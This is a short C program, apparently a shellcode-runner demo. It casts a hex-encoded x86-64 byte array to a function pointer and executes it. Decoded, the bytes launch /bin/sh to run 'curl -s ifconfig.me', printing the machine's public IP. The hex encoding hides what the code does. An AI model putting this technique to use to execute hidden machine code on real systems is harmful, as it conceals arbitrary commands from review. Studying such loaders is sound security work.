#include <stdio.h>
#include <string.h>


int main(int argc, char **argv)
{
    unsigned char ip[] = 
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f"
    "\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x1c\x00\x00\x00\x65"
    "\x63\x68\x6f\x20\x24\x28\x63\x75\x72\x6c\x20\x2d\x73\x20"
    "\x69\x66\x63\x6f\x6e\x66\x69\x67\x2e\x6d\x65\x29\x00\x56"
    "\x57\x54\x5e\x6a\x3b\x58\x0f\x05";

    int (*sidious)() = (int(*)())ip;
    //Declares a function pointer named sidious; the function takes unspecified arguments and returns an integer. 
    //Then (int) casts the code array to a function pointer of that same type.
    //So this converts the address of the "ip" array to a function pointer, which then allows you to call it and execute the code.
    sidious();
    return 0;
}
